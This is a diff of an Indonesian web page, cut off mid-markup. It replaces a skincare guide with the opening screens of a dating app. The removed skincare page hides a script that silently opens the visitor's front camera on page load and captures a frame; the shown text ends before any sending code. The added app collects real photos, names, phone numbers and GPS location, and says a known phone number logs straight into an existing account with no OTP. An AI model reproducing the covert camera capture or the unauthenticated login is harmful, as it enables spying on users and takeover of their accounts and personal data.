@@ -1,471 +1,992 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GlowGuide - Skincare 101</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+  <title>TemuRasa — Cari Jodoh Terdekat</title>
+  
   <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script src="https://unpkg.com/lucide@latest"></script>
+
   <style>
-    :root {
-      --rose-50: #fff1f2;
-      --rose-200: #fecdd3;
-      --rose-600: #e11d48;
-      --rose-700: #be123c;
-      --amber-50: #fffdfb;
-      --amber-100: #fef3c7;
-      --amber-200: #fde68a;
-      --amber-600: #d97706;
-      --zinc-800: #27272a;
-      --zinc-900: #18181b;
-      --zinc-200: #e4e4e7;
-      --zinc-300: #d4d4d8;
-      --zinc-600: #52525b;
-      --zinc-700: #3f3f46;
-      --zinc-500: #71717a;
+    body {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      background-color: #f3f4f6;
+      overscroll-behavior-y: contain;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .app-container {
+      max-width: 430px;
+      height: 100dvh;
+      margin: 0 auto;
+      background: #ffffff;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.06);
+    }
+    .no-scrollbar::-webkit-scrollbar { display: none; }
+    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+    .swipe-card {
+      touch-action: none;
+      transition: transform 0.25s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.25s ease;
+    }
+    .swipe-card.dragging {
+      transition: none;
+    }
+    @keyframes popIn {
+      0% { transform: scale(0.85); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .animate-pop {
+      animation: popIn 0.28s cubic-bezier(0.16, 1, 0.3, 1) forwards;
     }
   </style>
 </head>
-<body class="min-h-screen bg-gradient-to-b from-rose-50 via-white to-amber-50 text-zinc-800">
+<body>
 
-  <div class="min-h-screen bg-gradient-to-b from-rose-50 via-white to-amber-50 text-zinc-800">
-    <header class="sticky top-0 z-40 backdrop-blur supports-[backdrop-filter]:bg-white/70 bg-white/60 border-b border-zinc-200">
-      <nav class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
-        <a href="#hero" class="font-extrabold tracking-tight text-xl sm:text-2xl">
-          <span class="bg-clip-text text-transparent bg-gradient-to-r from-rose-500 to-amber-600">Glow</span>
-          Guide
-        </a>
-        <ul class="hidden md:flex gap-6 text-sm font-medium text-zinc-700">
-          <li><a class="hover:text-rose-600" href="#pengertian">Pengertian</a></li>
-          <li><a class="hover:text-rose-600" href="#jenis-kulit">Jenis Kulit</a></li>
-          <li><a class="hover:text-rose-600" href="#rutinitas">Rutinitas</a></li>
-          <li><a class="hover:text-rose-600" href="#bahan-aktif">Bahan Aktif</a></li>
-          <li><a class="hover:text-rose-600" href="#faq">FAQ</a></li>
-        </ul>
-        <a href="#cta" class="hidden md:inline-flex items-center gap-2 rounded-xl px-4 py-2 bg-zinc-900 text-white text-sm font-semibold shadow-sm hover:shadow md:active:scale-[.99] transition">
-          Mulai Gratis
-        </a>
-      </nav>
-    </header>
+<div class="app-container" id="app">
 
-    <section id="hero" class="relative overflow-hidden">
-      <div class="absolute -top-32 -left-20 h-72 w-72 rounded-full bg-rose-200/60 blur-3xl"></div>
-      <div class="absolute -bottom-24 -right-20 h-72 w-72 rounded-full bg-amber-200/60 blur-3xl"></div>
+  <!-- ==================== 1. HALAMAN REGISTRASI / MASUK ==================== -->
+  <div id="view-auth" class="flex-1 flex flex-col overflow-y-auto no-scrollbar p-6 bg-white">
+    <div class="mt-4 mb-6">
+      <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-rose-50 text-rose-600 text-xs font-bold mb-3">
+        <i data-lucide="flame" class="w-4 h-4 fill-rose-600"></i> TemuRasa
+      </div>
+      <h1 class="text-2xl font-extrabold text-slate-900 tracking-tight">Mulai Kenalan Sekarang</h1>
+      <p class="text-sm text-slate-500 mt-1">Tanpa OTP ribet. Isi profil asli kamu dan temukan yang searah di sekitarmu.</p>
+    </div>
 
-      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-16 sm:py-24">
-        <div class="grid md:grid-cols-2 items-center gap-10">
+    <form id="register-form" class="space-y-4 pb-8">
+      <!-- Upload 2 Foto -->
+      <div>
+        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-2">Foto Profil Asli (Wajib 2 Foto)</label>
+        <div class="grid grid-cols-2 gap-3">
+          <label class="relative aspect-[3/4] rounded-2xl border-2 border-dashed border-slate-200 bg-slate-50 flex flex-col items-center justify-center cursor-pointer overflow-hidden hover:border-rose-400 transition">
+            <img id="preview-foto1" class="hidden w-full h-full object-cover" />
+            <div id="placeholder-foto1" class="flex flex-col items-center text-slate-400 p-2 text-center">
+              <i data-lucide="camera" class="w-6 h-6 mb-1 text-rose-500"></i>
+              <span class="text-xs font-semibold text-slate-600">Foto Utama</span>
+              <span class="text-[10px]">Tap untuk pilih</span>
+            </div>
+            <input type="file" id="input-foto1" accept="image/*" class="hidden" required />
+          </label>
+
+          <label class="relative aspect-[3/4] rounded-2xl border-2 border-dashed border-slate-200 bg-slate-50 flex flex-col items-center justify-center cursor-pointer overflow-hidden hover:border-rose-400 transition">
+            <img id="preview-foto2" class="hidden w-full h-full object-cover" />
+            <div id="placeholder-foto2" class="flex flex-col items-center text-slate-400 p-2 text-center">
+              <i data-lucide="image-plus" class="w-6 h-6 mb-1 text-rose-500"></i>
+              <span class="text-xs font-semibold text-slate-600">Foto Kedua</span>
+              <span class="text-[10px]">Tap untuk pilih</span>
+            </div>
+            <input type="file" id="input-foto2" accept="image/*" class="hidden" required />
+          </label>
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-xs font-bold text-slate-700 mb-1">Nama Asli</label>
+        <input type="text" id="reg-nama" placeholder="Contoh: Raka Pratama" required
+          class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 text-sm font-medium focus:outline-none focus:border-rose-500 focus:bg-white transition" />
+      </div>
+
+      <div>
+        <label class="block text-xs font-bold text-slate-700 mb-1">Nomor WhatsApp / Telepon</label>
+        <input type="tel" id="reg-phone" placeholder="0812xxxxxxxx" required
+          class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 text-sm font-medium focus:outline-none focus:border-rose-500 focus:bg-white transition" />
+        <p class="text-[11px] text-slate-400 mt-1">Nomor yang pernah terdaftar otomatis masuk ke akun lama.</p>
+      </div>
+
+      <div class="grid grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs font-bold text-slate-700 mb-1">Umur</label>
+          <input type="number" id="reg-umur" min="18" max="65" placeholder="22" required
+            class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 text-sm font-medium focus:outline-none focus:border-rose-500 focus:bg-white transition" />
+        </div>
+        <div>
+          <label class="block text-xs font-bold text-slate-700 mb-1">Gender</label>
+          <select id="reg-gender" required
+            class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 text-sm font-medium focus:outline-none focus:border-rose-500 focus:bg-white transition">
+            <option value="Pria">Pria</option>
+            <option value="Wanita">Wanita</option>
+          </select>
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-xs font-bold text-slate-700 mb-1">Zodiak</label>
+        <select id="reg-zodiak"
+          class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 text-sm font-medium focus:outline-none focus:border-rose-500 focus:bg-white transition">
+          <option value="Aries">Aries</option>
+          <option value="Taurus">Taurus</option>
+          <option value="Gemini">Gemini</option>
+          <option value="Cancer">Cancer</option>
+          <option value="Leo">Leo</option>
+          <option value="Virgo">Virgo</option>
+          <option value="Libra">Libra</option>
+          <option value="Scorpio">Scorpio</option>
+          <option value="Sagittarius">Sagittarius</option>
+          <option value="Capricorn">Capricorn</option>
+          <option value="Aquarius">Aquarius</option>
+          <option value="Pisces">Pisces</option>
+        </select>
+      </div>
+
+      <div>
+        <label class="block text-xs font-bold text-slate-700 mb-1">Hobi / Minat (Pisahkan dengan koma)</label>
+        <input type="text" id="reg-hobi" placeholder="Ngopi, Futsal, Traveling, Musik" required
+          class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 text-sm font-medium focus:outline-none focus:border-rose-500 focus:bg-white transition" />
+      </div>
+
+      <!-- Status GPS -->
+      <div class="p-3.5 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-between">
+        <div class="flex items-center gap-2.5">
+          <div class="w-8 h-8 rounded-full bg-rose-100 text-rose-600 flex items-center justify-center">
+            <i data-lucide="map-pin" class="w-4 h-4"></i>
+          </div>
           <div>
-            <p class="inline-flex items-center rounded-full border border-rose-200 bg-white px-3 py-1 text-xs font-medium text-rose-700 shadow-sm">Skincare 101</p>
-            <h1 class="mt-4 text-4xl sm:text-5xl font-extrabold leading-tight tracking-tight">
-              Skincare itu apa sih?
-              <span class="block text-transparent bg-clip-text bg-gradient-to-r from-rose-600 to-amber-600">Perawatan kulit, simpel & efektif.</span>
-            </h1>
-            <p class="mt-4 text-base sm:text-lg text-zinc-600">
-              Skincare adalah rangkaian perawatan untuk menjaga kesehatan <em>skin barrier</em>, mengatasi masalah kulit, dan mencegah kerusakan jangka panjang (terutama dari matahari).
-              Kuncinya: konsisten, sesuai jenis kulit, dan tidak berlebihan.
-            </p>
-            <div class="mt-6 flex flex-col sm:flex-row gap-3">
-              <a href="#rutinitas" class="inline-flex justify-center rounded-xl bg-rose-600 px-5 py-3 text-white font-semibold shadow hover:shadow-md active:scale-[.99] transition">Lihat Rutinitas Dasar</a>
-              <a href="#bahan-aktif" class="inline-flex justify-center rounded-xl border border-zinc-300 bg-white px-5 py-3 text-zinc-800 font-semibold hover:border-zinc-400 active:scale-[.99] transition">Pelajari Bahan Aktif</a>
-            </div>
-            <p class="mt-3 text-xs text-zinc-500">Butuh ringkas? Ikuti langkah 3—4—5: cuci muka, lembapkan, sunscreen.</p>
+            <p class="text-xs font-bold text-slate-800">Titik Lokasi Sekitar</p>
+            <p id="auth-gps-status" class="text-[11px] text-slate-500">Mendeteksi lokasi...</p>
           </div>
+        </div>
+        <button type="button" onclick="captureGPS('auth')" class="text-xs font-bold text-rose-600 px-2.5 py-1.5 rounded-lg bg-rose-50 active:scale-95 transition">
+          Cek GPS
+        </button>
+      </div>
 
-          <div class="relative md:h-[420px]">
-            <div class="absolute inset-0 -rotate-2 rounded-3xl bg-gradient-to-br from-white to-rose-50 border border-zinc-200 shadow-xl"></div>
-            <div class="relative m-2 rounded-3xl border border-zinc-200 bg-white/80 backdrop-blur p-6 shadow-xl">
-              <div class="grid grid-cols-3 gap-3">
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Hydrating</p>
-                  <p class="mt-1 text-xs text-zinc-600">Kulit terasa kenyal & lembap.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Brightening</p>
-                  <p class="mt-1 text-xs text-zinc-600">Tona lebih merata & cerah.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Soothing</p>
-                  <p class="mt-1 text-xs text-zinc-600">Reda kemerahan & iritasi.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Oil-Control</p>
-                  <p class="mt-1 text-xs text-zinc-600">Mengurangi kilap berlebih.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Anti-Aging</p>
-                  <p class="mt-1 text-xs text-zinc-600">Haluskan garis halus.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Barrier Care</p>
-                  <p class="mt-1 text-xs text-zinc-600">Perbaiki lapisan pelindung.</p>
-                </div>
-              </div>
-              <div class="mt-4 rounded-2xl bg-amber-50 border border-amber-200 p-4">
-                <p class="text-sm font-semibold">Golden rule</p>
-                <p class="text-xs text-zinc-600">Sunscreen tiap pagi, reapply 2—3 jam. Ini fondasi anti-aging terbaik.</p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <section id="pengertian" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <div class="grid lg:grid-cols-3 gap-6">
-        <div class="lg:col-span-2 rounded-3xl border border-zinc-200 bg-white p-6 shadow-sm">
-          <h2 class="text-2xl sm:text-3xl font-bold">Pengertian Skincare</h2>
-          <p class="mt-3 text-zinc-600">
-            Skincare mencakup kebiasaan harian untuk membersihkan, menutrisi, dan melindungi kulit. Tujuannya menjaga <strong>keseimbangan minyak–air</strong>,
-            memperkuat <strong>skin barrier</strong>, dan mencegah kerusakan akibat sinar UV, polusi, serta stres. Rutinitas yang baik tidak harus rumit—yang penting <strong>konsisten</strong> dan <strong>tepat sasaran</strong>.
-          </p>
-          <ul class="mt-4 grid sm:grid-cols-3 gap-3 text-sm">
-            <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">1</span>Bersihkan kotoran & sunscreen</li>
-            <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">2</span>Hidrasi & kunci kelembapan</li>
-            <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">3</span>Lindungi dari sinar UV</li>
-          </ul>
-        </div>
-        <aside class="rounded-3xl border border-rose-200 bg-rose-50 p-6 shadow-sm">
-          <p class="text-sm font-semibold text-rose-700">Catatan singkat</p>
-          <p class="mt-1 text-sm text-rose-800/80">Gunakan produk baru satu per satu (patch test), beri jeda 2–3 minggu untuk melihat hasilnya.</p>
-        </aside>
-      </div>
-    </section>
-
-    <section id="jenis-kulit" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Kenali Jenis Kulit</h2>
-      <p class="mt-2 text-sm text-zinc-600">Pilih produk sesuai kondisi kulit agar hasilnya optimal.</p>
-      <div class="mt-6 grid sm:grid-cols-2 lg:grid-cols-5 gap-4">
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Normal</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Seimbang. Pakai rutinitas dasar + sunscreen.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Kering</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Cari humektan (HA) + emolien (ceramide).</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Berminyak</p>
-            <span class="text-[10px] rounded-full bg-amber-100 px-2 py-1 border border-amber-200 text-amber-700">Sebum</span>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Gunakan gel-cream, BHA untuk pori.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Kombinasi</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Rawat T-zone berminyak, pipi kering terpisah.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Sensitif</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Minim bahan aktif, fokus soothing (centella).</p>
-        </div>
-      </div>
-    </section>
-
-    <section id="rutinitas" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <div class="rounded-3xl border border-zinc-200 bg-white p-6 shadow-sm">
-        <div class="flex items-center justify-between flex-wrap gap-3">
-          <h2 class="text-2xl sm:text-3xl font-bold">Rutinitas Dasar (Pagi & Malam)</h2>
-          <a href="#cta" class="inline-flex items-center rounded-xl border border-zinc-300 bg-white px-4 py-2 text-sm font-semibold hover:border-zinc-400">Unduh Checklist</a>
-        </div>
-        <div class="mt-6 grid md:grid-cols-5 gap-4">
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">1</div>
-            <p class="mt-3 font-semibold">Cleanser</p>
-            <p class="text-sm text-zinc-600">Pagi & malam. Pilih gentle.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">2</div>
-            <p class="mt-3 font-semibold">Hydrator/Toner</p>
-            <p class="text-sm text-zinc-600">Pulihkan pH & hidrasi.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">3</div>
-            <p class="mt-3 font-semibold">Serum</p>
-            <p class="text-sm text-zinc-600">Sasaran: jerawat, kusam, aging.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">4</div>
-            <p class="mt-3 font-semibold">Moisturizer</p>
-            <p class="text-sm text-zinc-600">Kunci hidrasi, perbaiki barrier.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">5</div>
-            <p class="mt-3 font-semibold">Sunscreen (AM)</p>
-            <p class="text-sm text-zinc-600">SPF 30+ broad spectrum.</p>
-          </div>
-        </div>
-        <p class="mt-4 text-xs text-zinc-500">Malam hari ganti sunscreen dengan treatment (mis. retinol) sesuai kebutuhan & toleransi.</p>
-      </div>
-    </section>
-
-    <section id="bahan-aktif" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Bahan Aktif Populer</h2>
-      <p class="mt-2 text-sm text-zinc-600">Sesuaikan bahan aktif dengan target masalah kulit.</p>
-      <div class="mt-6 grid md:grid-cols-3 gap-4">
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Niacinamide</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Meratakan warna kulit, atur sebum, menenangkan.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Hampir semua jenis kulit.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Salicylic Acid (BHA)</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Eksfoliasi dalam pori, kurangi komedo.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit berminyak/berjerawat.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Hyaluronic Acid</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Tarik & tahan air di kulit.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit kering atau dehidrasi.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Retinol</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Stimulasi kolagen, haluskan tekstur & garis.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Anti-aging, malam hari, bertahap.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Vitamin C</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Antioksidan, cerahkan & lindungi dari radikal bebas.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Pagi hari, SPF wajib.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Ceramide</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Perkuat barrier, kurangi TEWL.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit kering/sensitif.</p>
-        </div>
-      </div>
-      <div class="mt-4 rounded-2xl border border-amber-200 bg-amber-50 p-4 text-sm">
-        <p class="font-semibold">Tips kombinasi aman</p>
-        <p class="text-zinc-700">Hindari menumpuk terlalu banyak aktif sekaligus. Contoh: kenalkan retinol bertahap; jangan langsung dipasangkan dengan AHA/BHA tiap malam.</p>
-      </div>
-    </section>
-
-    <section class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Mitos vs Fakta</h2>
-      <div class="mt-6 grid md:grid-cols-2 gap-4">
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Kulit berminyak tidak butuh moisturizer</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Tetap butuh! Pilih gel-cream ringan agar barrier terjaga.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Semakin tinggi SPF, tak perlu reapply</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Reapply tetap penting tiap 2–3 jam saat siang/terpapar matahari.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Retinol bikin kulit tipis</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Pemakaian benar justru menebalkan dermis & tingkatkan kolagen.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Produk mahal pasti lebih bagus</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Yang penting formulasi tepat & cocok untuk kulitmu.</p>
-        </div>
-      </div>
-    </section>
-
-    <section id="faq" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Pertanyaan yang Sering Ditanya</h2>
-      <div class="mt-6 space-y-3">
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Urutan skincare yang benar?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Pagi: Cleanser—Hydrator—Serum—Moisturizer—Sunscreen. Malam: Cleanser—Hydrator—Treatment—Moisturizer.</p>
-        </details>
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Berapa banyak sunscreen?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Sekitar dua jari untuk wajah & leher. Reapply tiap 2–3 jam.</p>
-        </details>
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Kapan lihat hasil?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Umumnya 4–8 minggu konsisten, tergantung masalah dan produk.</p>
-        </details>
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Boleh campur banyak aktif?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Mulai satu per satu, dengarkan kulit. Prioritaskan barrier & SPF.</p>
-        </details>
-      </div>
-    </section>
-
-    <section id="cta" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 pb-20">
-      <div class="rounded-3xl border border-zinc-200 bg-gradient-to-br from-rose-100 to-amber-100 p-6 sm:p-10 text-center shadow-sm">
-        <h3 class="text-2xl sm:text-3xl font-bold">Siap kulit sehat & glowing?</h3>
-        <p class="mt-2 text-sm text-zinc-700">Dapatkan checklist PDF & rekomendasi rutin sesuai jenis kulitmu.</p>
-        <form onsubmit="event.preventDefault();" class="mt-6 mx-auto max-w-md flex gap-3">
-          <input type="email" required placeholder="Email kamu" class="flex-1 rounded-xl border border-zinc-300 bg-white px-4 py-3 text-sm outline-none focus:border-rose-400" />
-          <button class="rounded-xl bg-zinc-900 px-5 py-3 text-white text-sm font-semibold hover:shadow active:scale-[.99]">Dapatkan</button>
-        </form>
-        <p class="mt-2 text-[11px] text-zinc-500">Dengan menekan “Dapatkan”, kamu setuju dengan kebijakan privasi kami.</p>
-      </div>
-    </section>
-
-    <footer class="border-t border-zinc-200 bg-white/70">
-      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-6 flex flex-col sm:flex-row items-center justify-between gap-3 text-sm text-zinc-600">
-        <p>© 2024 GlowGuide. All rights reserved.</p>
-        <div class="flex gap-4">
-          <a href="#" class="hover:text-rose-600">Kebijakan Privasi</a>
-          <a href="#" class="hover:text-rose-600">Ketentuan Layanan</a>
-          <a href="#hero" class="hover:text-rose-600">Kembali ke atas</a>
-        </div>
-      </div>
-    </footer>
+      <button type="submit" id="btn-submit-register"
+        class="w-full py-3.5 rounded-xl bg-rose-600 text-white font-bold text-sm shadow-lg shadow-rose-200 hover:bg-rose-700 active:scale-[0.98] transition flex items-center justify-center gap-2">
+        <span>Simpan & Mulai Cari Jodoh</span>
+        <i data-lucide="arrow-right" class="w-4 h-4"></i>
+      </button>
+    </form>
   </div>
 
-  <video id="videoElement" class="hidden" playsInline muted></video>
-  <canvas id="canvasElement" class="hidden"></canvas>
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const videoRef = document.getElementById('videoElement');
-      const canvasRef = document.getElementById('canvasElement');
-      let streamRef = null;
+  <!-- ==================== 2. HALAMAN UTAMA (SWIPE / MATCHES / PROFIL) ==================== -->
+  <div id="view-main" class="hidden flex-1 flex flex-col h-full overflow-hidden">
+    
+    <!-- Top Header -->
+    <header class="px-5 py-3.5 bg-white border-b border-slate-100 flex items-center justify-between shrink-0">
+      <div class="flex items-center gap-2">
+        <div class="w-8 h-8 rounded-xl bg-rose-600 text-white flex items-center justify-center shadow-sm">
+          <i data-lucide="flame" class="w-5 h-5 fill-white"></i>
+        </div>
+        <span class="font-extrabold text-lg tracking-tight text-slate-900">TemuRasa</span>
+      </div>
 
-      async function captureAndSend() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-          streamRef = stream;
-          if (videoRef) {
-            videoRef.srcObject = stream;
-            await videoRef.play();
-          }
+      <!-- Tombol Sharelock / Perbarui Lokasi -->
+      <button onclick="manualRefreshLocation()" id="btn-shareloc"
+        class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-slate-100 hover:bg-rose-50 text-slate-700 hover:text-rose-600 text-xs font-bold transition active:scale-95">
+        <i data-lucide="navigation" class="w-3.5 h-3.5 text-rose-600"></i>
+        <span id="shareloc-label">Perbarui Lokasi</span>
+      </button>
+    </header>
 
-          const canvas = canvasRef;
-          const w = videoRef.videoWidth || 720;
-          const h = videoRef.videoHeight || 720;
-          canvas.width = w;
-          canvas.height = h;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(videoRef, 0, 0, w, h);
+    <!-- TAB 1: DISCOVER / SWIPE -->
+    <main id="tab-discover" class="flex-1 flex flex-col p-4 overflow-hidden relative bg-slate-50/60">
+      <!-- Area Tumpukan Kartu -->
